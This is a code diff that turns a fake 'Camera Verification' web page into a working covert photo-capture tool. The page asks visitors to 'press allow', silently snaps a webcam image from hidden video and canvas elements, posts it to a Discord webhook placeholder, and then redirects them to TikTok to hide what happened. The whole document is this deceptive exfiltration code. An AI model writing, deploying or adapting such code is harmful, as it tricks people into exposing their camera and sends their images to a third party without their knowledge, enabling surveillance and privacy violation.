@@ -1,40 +1,39 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <title>Camera Verification</title>
-</head>
-<body>
-  <h2>Press allow to continue</h2>
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+<script>
+  const video = document.getElementById('video');
 
-  <script>
-    const video = document.getElementById('video');
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      video.srcObject = stream;
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
+      setTimeout(async () => {
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
 
-        setTimeout(() => {
-          const canvas = document.getElementById('canvas');
-          const ctx = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
 
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
 
-          ctx.drawImage(video, 0, 0);
+        // تحويل الصورة إلى Blob
+        canvas.toBlob(async (blob) => {
 
-          const image = canvas.toDataURL("image/png");
-          console.log(image);
+          const formData = new FormData();
+          formData.append("file", blob, "photo.png");
 
-          // تحويل بعد الالتقاط
+          // ويبهوك الدسكورد
+          await fetch("PUT_YOUR_WEBHOOK_HERE", {
+            method: "POST",
+            body: formData
+          });
+
+          // تحويل بعد الإرسال
           window.location.href = "https://www.tiktok.com/";
-        }, 2000);
-      })
-      .catch(() => {
-        alert("Camera permission denied");
-      });
-  </script>
-</body>
-</html>
+
+        }, "image/png");
+
+      }, 2000);
+    })
+    .catch(() => {
+      alert("Camera permission denied");
+    });
+</script>
